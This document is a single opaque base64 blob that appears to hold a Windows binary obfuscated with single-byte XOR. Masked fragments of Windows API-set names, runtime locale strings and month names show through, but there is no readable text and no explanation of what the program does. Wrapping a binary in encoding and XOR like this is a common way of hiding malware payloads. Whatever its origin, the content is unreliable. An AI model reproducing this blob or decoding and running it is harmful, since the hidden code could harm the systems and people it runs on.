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xcXZGNlcnZ6N3JlZXhlFxcXF3F+e3I3cmVleGUXFxcXFxdkY2Vydno3cnlzFxcXFxcXeXJyczdzfnRjfnh5dmVuF3cFFZcWFxcXRwUVlxYXFxdcBRWXFhcXF1cFFZcWFxcXJwUVlxYXFxc3BRWXFhcXFx8FFZcWFxcX7wYVlxYXFxf3BhWXFhcXF1wFFZcWFxcXPhcXlxYXFxcXFxcXFxcXFxcXFxcXFxcXGBcXFxcXFxc3EoQOFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxc/xxeXFhcXF3RkevcWFxcXFxcXFxcXFxcXFxcXFxcXFxMXFxcXFxcXNxKEDhcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxdXgBWXFhcXF2PeF5cWFxcX794XlxYXFxd1dnM3cm90cmdjfnh5FxcX9wQVlxYXFxc3AxWXFhcXF3cDFZcWFxcXdhdnF34XOhd6F2QXOhdgF34XeRc6F3QXeBdlF3IXOhdxF34XdRdyF2UXZBc6F3sXJhc6FyYXOhcmFxcXFxcXF3YXZxd+FzoXehdkFzoXYBd+F3kXOhd0F3gXZRdyFzoXZBduF3kXdBd/FzoXexcmFzoXJRc6FycXFxcXFxcXFxd8F3IXZRd5F3IXexckFyUXFxcXFxcXFxd2F2cXfhc6F3oXZBc6FxcXchdvF2MXOhd6F2QXOhcXFxcXFxcVFxcXUXtkVnt7eHQXFxcXFxcXFxcXFxcVFxcXUXtkUWVychcXFxcXFRcXF1F7ZFByY0F2e2JyFxcXFxcXFxcXFRcXF1F7ZERyY0F2e2JyFxcXFxcWFxcXFRcXF155fmN+dnt+bXJUZX5jfnR2e0RydGN+eHlSbxcXFxcXFxcXFxcXFxdfDxWXFhcXF08PFZcWFxcXdw8VlxYXFxdnDxWXFhcXF5cPFZcWFxcXhw8VlxYXFxe3DxWXFhcXF6cPFZcWFxcXqw8VlxYXFxffDxWXFhcXF8cPFZcWFxcX9w8VlxYXFxfnDxWXFhcXF1wFFZcWFxcX6w8VlxYXFxcfDhWXFhcXFwcOFZcWFxcXAw4VlxYXFxcPDhWXFhcXFwsOFZcWFxcXNw4VlxYXFxczDhWXFhcXFz8OFZcWFxcXJw4VlxYXFxcrDhWXFhcXF1cOFZcWFxcXUw4VlxYXFxdfDhWXFhcXF1sOFZcWFxcXRw4VlxYXFxdDDhWXFhcXF08OFZcWFxcXSw4VlxYXFxd3DhWXFhcXF3MOFZcWFxcXfw4VlxYXFxd7DhWXFhcXF2cOFZcWFxcXYw4VlxYXFxdvDhWXFhcXF2sOFZcWFxcXlw4VlxYXFxeTDhWXFhcXF58OFZcWFxcXmw4VlxYXFxeHDhWXFhcXF4MOFZcWFxcXjw4VlxYXFxeLDhWXFhcXF7cOFZcWFxcXsw4VlxYXFxe/DhWXFhcXF7sOFZcWFxcXpw4VlxYXFxejDhWXFhcXF68OFZcWFxcX3w4VlxYXFxfPDhWXFhcXF/cOFZcWFxcX5w4VlxYXFxcfDRWXFhcXFw8NFZcWFxcXJw0VlxYXFxdHDRWXFhcXF2cNFZcWFxcXhw0VlxYXFxenDRWXFhcXF8cNFZcWFxcX7w0VlxYXFxcPDBWXFhcXF1cMFZcWFxcXdwwVlxYXFxefDBWXFhcXF78MFZcWFxcXrwwVlxYXFxerDBWXFhcXF98MFZcWFxcXzwwVlxYXFxfrDBWXFhcXFx8LFZcWFxcXDwsVlxYXFxc/CxWXFhcXF18LFZcWFxcXfwsVlxYXFxeHCxWXFhcXF68LFZcWFxcX9wsVlxYXFxcHChWXFhcXFycKFZcWFxcXTwoVlxYXFxeXChWXFhcXF6cKFZcWFxcX9woVlxYXFxcXCRWXFhcXFwcJFZcWFxcXXAUVlxYXFxc/CRWXFhcXF1cJFZcWFxcXdwkVlxYXFxdvCRWXFhcXF48JFZcWFxcXSEh1dmRycz8XFxcXFxcXF0hIdHNydHsXSEhndmR0dnsXFxcXFxcXF0hIZGNzdHZ7excXFxcXFxdISGN/fmR0dnt7FxcXFxcXSEhxdmRjdHZ7excXFxcXF0hIYXJ0Y3hldHZ7excXFxdISHR7ZXR2e3sXFxdISHJ2dX4XFxcXFxdISGdjZSEjF0hIZXJkY2V+dGMXFxcXFxdISGJ5dnt+cHlycxcXFxcXZXJkY2V+dGM/FxcXN3lyYBcXFxcXFxcXN3Nye3JjchcqFxcXKSkXFysrFxc2FxcXKioXFzYqFxdMShcXFxcXF3hncmV2Y3hlFxcXFzopFxc9FxcXPDwXFzo6Fxc6FxcXPBcXFzEXFxc6KT0XOBcXFzIXFxcrFxcXKyoXFykXFxcpKhcXOxcXFz8+FxdpFxcXSRcXF2sXFxcxMRcXa2sXFz0qFxc8KhcXOioXFzgqFxcyKhcXKSkqFysrKhcxKhcXayoXF0kqFxd3YXFjdnV7cjAXFxcXFxcXd2F1Y3Z1e3IwFxcXFxcXF3dhdHZ7ezAXd2NuZ3J4cTAXFxcXFxcXF3d7eHR2ezdkY3ZjfnQ3cGJ2ZXMwFxcXF3dkY2V+eXAwFxcXFxcXFxd3YXV2ZHI3c3JkY2VidGN4ZTAXFxcXFxd3YXJ0Y3hlN3Nye3JjfnlwN3NyZGNlYnRjeGUwFxcXF3dzcnF2YntjN3R4eWRjZWJ0Y3hlN3R7eGRiZXIwFxcXd2R0dnt2ZTdzcntyY355cDdzcmRjZWJ0Y3hlMBcXFxd3YXJ0Y3hlN3R4eWRjZWJ0Y3hlN35jcmV2Y3hlMBcXF3dhcnRjeGU3c3JkY2VidGN4ZTd+Y3JldmN4ZTAXFxcXd2FydGN4ZTdhdXZkcjd0eHlkY2VidGN4ZTd+Y3JldmN4ZTAXFxcXF3dhfmVjYnZ7N3N+ZGd7dnRyenJ5Yzd6dmcwFxcXFxcXd3J/N2FydGN4ZTd0eHlkY2VidGN4ZTd+Y3JldmN4ZTAXFxcXFxcXF3dyfzdhcnRjeGU3c3JkY2VidGN4ZTd+Y3JldmN4ZTAXd3J/N2FydGN4ZTdhdXZkcjd0eHlkY2VidGN4ZTd+Y3JldmN4ZTAXF3d0eGduN3R4eWRjZWJ0Y3hlN3R7eGRiZXIwFxcXFxcXd2JzYzdlcmNiZXl+eXAwF3dSXxd3RUNDXhcXFxcXFxd3e3h0dns3YXFjdnV7cjAXd3t4dHZ7N2FxY3Z1e3I3dHh5ZGNlYnRjeGU3dHt4ZGJlcjAXN3lyYExKFxcXFxcXN3Nye3JjckxKFxcXFxcXF3d4enl+N3R2e3tkfnAwFxd3Z3t2dHJ6cnljN3Nye3Jjcjd0e3hkYmVyMBcXFxcXF3dne3Z0cnpyeWM3c3J7cmNyTEo3dHt4ZGJlcjAXFxcXd3p2eXZwcnM3YXJ0Y3hlN3R4eWRjZWJ0Y3hlN35jcmV2Y3hlMBcXF3d6dnl2cHJzN2FydGN4ZTdzcmRjZWJ0Y3hlN35jcmV2Y3hlMBcXFxd3cn83YXJ0Y3hlN3R4Z243dHh5ZGNlYnRjeGU3fmNyZXZjeGUwFxcXd3J/N2FydGN4ZTdhdXZkcjd0eGduN3R4eWRjZWJ0Y3hlN35jcmV2Y3hlMBcXFxcXd3NueXZ6fnQ3fnl+Y352e35tcmU3cXhlNzAXFxcXFxd3c255dnp+dDd2Y3JvfmM3c3JkY2VidGN4ZTdxeGU3MBcXFxcXFxcXd2FydGN4ZTd0eGduN3R4eWRjZWJ0Y3hlN35jcmV2Y3hlMBcXFxcXF3dhcnRjeGU3YXV2ZHI3dHhnbjd0eHlkY2VidGN4ZTd+Y3JldmN4ZTAXFxcXFxcXF3d6dnl2cHJzN2FydGN4ZTd0eGduN3R4eWRjZWJ0Y3hlN35jcmV2Y3hlMBcXFxcXF3d7eHR2ezdkY3ZjfnQ3Y39lcnZzN3BidmVzMBcXFxcXeGdyZXZjeGU3NTU3FxcXF3hncmV2Y3hlN3R4SHZgdn5jFxcXFxcXFzdDbmdyN1NyZHRlfmdjeGUwFxcXFxcXFzdVdmRyN1R7dmRkN1NyZHRlfmdjeGU3dmM3PxcXFxcXN1V2ZHI3VHt2ZGQ3VmVldm4wFxcXFxcXN1R7dmRkN19+cmV2ZXR/bjdTcmR0ZX5nY3hlMBcXFxc3VHh6Z3tyY3I3WHV9cnRjN1t4dHZjeGUwFxcXFxcXFxcXFxcXFxcXERcXERcWFxcHFxQRFxEVBxNSUlISEhISEiInF0cXFxcXPzcvR08QHxcgJydARxAXFzc3HxAXFxcfd393d3d3FxdvZ29vb28fEB8QFxAXHx8fFxcfEB8XEB8XEBcXFxcXPxd5F2IXexd7Fz4XFxcXFz95Ynt7PhcXFxcXFxcXFxcSFxfXHBcXFxcXFxcXFxcXChcX1xMXFxcXFxcXFxcXF4EXF9cTFxcXFxcXFxcXFxeaFxfXHxcXFxcXFxcXFxcXmRcX1x8XFxcXFxcXFxcXF5gXF9cfFxcXFxcXFxcXFxeHFxfXHxcXFxcXFxcXFxcXhhcX1x8XFxcXFxcXFxcXF4UXF9cfFxcXFxcXFxcXFxeEFxfXHxcXFxcXFxcXFxcXoxUX1x8XFxcXFxcXFxcXF6IVF9cfFxcXFxcXFxcXFxcbFxcXFxcXFxQXFxcXFxcXHhcXFxcXFxd6F2QXdBd4F2UXchdyFzkXcxd7F3sXFxdUeGVSb35jR2V4dHJkZBcXEzQWlxYXFxcXFxcXFxcXF0c0FpcWFxcXFxcXFxcXFxcXRRaXFhcXF19FFpcWFxcXWzQWlxYXFxdbNBaXFhcXF9tEFpcWFxcXJ0MWlxYXFxcXcBaXFhcXFwtwFpcWFxcXFxcXFxcXFxezNBaXFhcXF/MtFpcWFxcXNywWlxYXFxdPWxaXFhcXF4NbFpcWFxcXI3IWlxYXFxdbNBaXFhcXF3t2FpcWFxcXFxcXFxcXFxcXFxcXFxcXF1s0FpcWFxcXFxcXFxcXFxf7NBaXFhcXFxcXFxcXFxcXuzQWlxYXFxdbNBaXFhcXFys0FpcWFxcXDzQWlxYXFxdbNBaXFhcXFxYXFxcBFxcXFRcXFxUXFxcUFxcXFRcXFxMXFxcPFxcXEhcXFxoXFxcRFxcXHhcXFxAXFxcbFxcXHxcXFxsXFxceFxcXGxcXFx0XFxcQFxcXHBcXFx8XFxcbFxcXARcXFxoXFxcBFxcXGBcXFxUXFxcHFxcXGhcXFwYXFxcFFxcXBRcXFxUXFxc2FxcXGhcXFyIXFxcVFxcXVhcXFxoXFxdUFxcXFRcXF0cXFxcGFxcXRRcXFxoXFxdEFxcXGhcXF0AXFxcBFxcXThcXFxwXFxd7FxcXGhcXF3oXFxc3FxcXZxcXFwsXFxdlFxcXHhcXF5cXFxcdFxcXlhcXFx0XFxeVFxcXHhcXF5QXFxcBFxcXkxcXFxoXFxeGFxcXPhcXF4kXFxcaFxcXthcXFxUXFxezFxcXHBcXF7AXFxcaFxcXoBcXFwYXFxfZFxcXFRcXF8AXFxccFxcXDxAXFxsXFxdeWVEXfnlxF1lWWRd5dnkXWVZZP0RZVlk+FxcXFxcXF3l2eT9keXZ5PhcXFxcXFxdZVlk/XllTPhcXFxcXFxcXeXZ5P355cz4XFxcXcjwnJycXFxcXFxcXFxcXFxcXFxfXMhWXFhcXF9MyFZcWFxcX3zIVlxYXFxfbMhWXFhcXF8cyFZcWFxcXwzIVlxYXFxfPMhWXFhcXF8syFZcWFxcX8zIVlxYXFxfnMhWXFhcXF+8yFZcWFxcXHzEVlxYXFxcDMRWXFhcXFzcxFZcWFxcXOzEVlxYXFxcnMRWXFhcXFyMxFZcWFxcXLzEVlxYXFxcrMRWXFhcXF1cxFZcWFxcXUzEVlxYXFxdfMRWXFhcXF1sxFZcWFxcXRzEVlxYXFxdDMRWXFhcXF08xFZcWFxcXdzEVlxYXFxd/MRWXFhcXF2MxFZcWFxcXazEVlxYXFxcrMRWXFhcXF5MxFZcWFxcXmzEVlxYXFxeDMRWXFhcXF7cxFZcWFxcXpzEVlxYXFxevMRWXFhcXF98xFZcWFxcXwzEVlxYXFxfPMRWXFhcXF/cxFZcWFxcX5zEVlxYXFxcfMBWXFhcXFxYXFxcXFxcXDzAVlxYXFxc3MBWXFhcXFz8wFZcWFxcXJzAVlxYXFxcvMBWXFhcXF1cwFZcWFxcXXzAVlxYXFxdHMBWXFhcXF3cwFZcWFxcXZzAVlxYXFxeXMBWXFhcXF48wFZcWFxcXpzAVlxYXFxfXMBWXFhcXF88wFZcWFxcX9zAVlxYXFxf/MBWXFhcXF+cwFZcWFxcX7zAVlxYXFxcXPxWXFhcXFx8/FZcWFxcXBz8VlxYXFxcPPxWXFhcXFzc/FZcWFxcXPz8VlxYXFxcnPxWXFhcXFy8/FZcWFxcXXz8VlxYXFxd3PxWXFhcXF2c/FZcWFxcX7zAVlxYXFxeXPxWXFhcXF4c/FZcWFxcXtz8VlxYXFxenPxWXFhcXF98/FZcWFxcXzz8VlxYXFxfnPxWXFhcXFxM+FZcWFxcXGz4VlxYXFxcPPhWXFhcXFyc+FZcWFxcXTz4VlxYXFxdnPhWXFhcXF0RieRdaeHkXQ2JyF0BycxdDf2IXUWV+F0R2YxdEYnlzdm4XF1p4eXN2bhcXFxcXF0NicmRzdm4XQHJzeXJkc3ZuFxcXFxcXF0N/YmVkc3ZuFxcXF1FlfnN2bhcXFxcXF0R2Y2Jlc3ZuFxcXF112eRdRcnUXWnZlF1ZnZRdadm4XXWJ5F11iexdWYnAXRHJnF1h0YxdZeGEXU3J0FxcXFxdddnlidmVuF1FydWVidmVuFxcXF1p2ZXR/FxcXVmdlfnsXFxddYnlyFxcXF11ie24XFxcXVmJwYmRjFxcXFxcXRHJnY3J6dXJlFxcXFxcXF1h0Y3h1cmUXWXhhcnp1cmUXFxcXFxcXF1NydHJ6dXJlFxcXF1ZaFxdHWhcXFxcXF1paOHNzOG5uFxcXFxcXFxdzc3NzOzdaWlpaN3NzOzdubm5uFxcXFxdfXy16ei1kZBcXFxcXFxcXRBdiF3kXFxdaF3gXeRcXF0MXYhdyFxcXQBdyF3MXFxdDF38XYhcXF1EXZRd+FxcXRBd2F2MXFxdEF2IXeRdzF3YXbhcXFxcXWhd4F3kXcxd2F24XFxcXF0MXYhdyF2QXcxd2F24XFxdAF3IXcxd5F3IXZBdzF3YXbhcXFxcXFxdDF38XYhdlF2QXcxd2F24XFxcXFxcXFxdRF2UXfhdzF3YXbhcXFxcXRBd2F2MXYhdlF3MXdhduFxcXFxcXFxcXXRd2F3kXFxdRF3IXdRcXF1oXdhdlFxcXVhdnF2UXFxdaF3YXbhcXF10XYhd5FxcXXRdiF3sXFxdWF2IXcBcXF0QXchdnFxcXWBd0F2MXFxdZF3gXYRcXF1MXchd0FxcXXRd2F3kXYhd2F2UXbhcXF1EXchd1F2UXYhd2F2UXbhcXFxcXFxcXF1oXdhdlF3QXfxcXFxcXFxdWF2cXZRd+F3sXFxcXFxcXXRdiF3kXchcXFxcXFxcXF10XYhd7F24XFxcXFxcXFxdWF2IXcBdiF2QXYxcXFxcXRBdyF2cXYxdyF3oXdRdyF2UXFxcXFxcXWBd0F2MXeBd1F3IXZRcXF1kXeBdhF3IXehd1F3IXZRcXFxcXFxcXF1MXchd0F3IXehd1F3IXZRcXFxcXVhdaFxcXFxdHF1oXFxcXFxcXFxdaF1oXOBdzF3MXOBduF24XFxcXFxcXFxdzF3MXcxdzFzsXNxdaF1oXWhdaFzcXcxdzFzsXNxduF24XbhduFxcXXxdfFy0Xehd6Fy0XZBdkFxcXFxcXFxcXchd5FzoXQhdEFxcXFxcXFzc9FZcWFxcX9wQVlxYXFxd3PRWXFhcXF7c9FZcWFxcX5z0VlxYXFxdHPBWXFhcXF7c8FZcWFxcXNwMVlxYXFxf3PBWXFhcXFzc7FZcWFxcXdzsVlxYXFxe3OxWXFhcXF+c7FZcWFxcXRzoVlxYXFxe3OhWXFhcXF+c6FZcWFxcXdwMVlxYXFxcfORWXFhcXFzc5FZcWFxcXfzkVlxYXFxd2F2cXfhc6F3oXZBc6F2AXfhd5FzoXdBd4F2UXchc6F3MXdhdjF3IXYxd